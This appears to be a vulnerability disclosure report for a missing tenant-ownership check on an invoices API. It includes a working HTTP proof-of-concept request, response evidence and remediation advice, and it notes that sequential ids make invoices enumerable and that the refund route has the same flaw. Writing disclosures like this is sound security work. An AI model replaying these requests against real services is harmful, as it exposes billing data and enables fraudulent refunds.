# <class> on <asset> <impact>

**Severity:** CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` — 7.7 High
**Asset:** https://app.acme.com/api/v2/invoices/{id}
**Accounts:** A = attacker@mail.test, B = victim@mail.test (both self-registered)

## Summary

`GET /api/v2/invoices/{id}` authorizes by session only and never checks tenant ownership. Any
authenticated user reads any invoice by incrementing the numeric id.

## Steps

1. As B, create invoice `1042`, note the body.
2. As A, send:

```http
GET /api/v2/invoices/1042 HTTP/1.1
Host: app.acme.com
Cookie: session=<A>
```

3. Response is `200` with B's invoice, including `billing_address` and `amount`.

## Evidence

```http
HTTP/1.1 200 OK
Content-Type: application/pdf

%PDF-1.7 ... Billing to: 12 Example St ... Total: 4,200.00
```

`evidence/req.txt`, `evidence/resp.pdf`, `evidence/proxy.har`

## Impact

Any of ~40k tenants' invoices are enumerable (ids are sequential). Discloses billing addresses and
amounts; combined with `/api/v2/invoices/1042/refund` (same missing check) an attacker can also
trigger refunds.

## Remediation

Check `invoice.tenant_id == session.tenant_id` in the object loader, not in the list query. Apply
the same to the refund route.

## Notes

Tested 2026-10-30 04:12 UTC against production. No rate limit observed below 50 rps.
